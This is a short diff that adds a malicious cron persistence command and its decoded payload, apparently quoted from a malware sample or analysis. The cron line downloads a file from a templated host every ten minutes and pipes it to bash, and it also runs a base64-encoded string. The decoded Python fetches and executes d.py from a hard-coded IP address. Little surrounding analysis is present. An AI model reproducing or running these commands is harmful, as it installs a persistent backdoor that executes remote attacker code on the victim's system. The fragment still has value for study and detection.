@@ -1,0 +1,4 @@
+echo '*/10 * * * * (curl -s %s/2.gif || wget -q -O - %s/2.gif || lwp-download %s/2.gif /tmp/2.gif) | bash -sh; bash /tmp/2.gif; rm -rf /tmp/2.gif; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xODUuMTcyLjEyOC4xNDY6NDQzL2QucHkiKS5yZWFkKCkpJyB8fCBweXRob24yIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xODUuMTcyLjEyOC4xNDYvZC5weSIpLnJlYWQoKSkn | base64 -d | bash' | crontab -
+
+The content after b64decode：
+python -c 'import urllib;exec(urllib.urlopen("http://185.172.128.146:443/d.py").read())' || python2 -c 'import urllib;exec(urllib.urlopen("http://185.172.128.146/d.py").read())
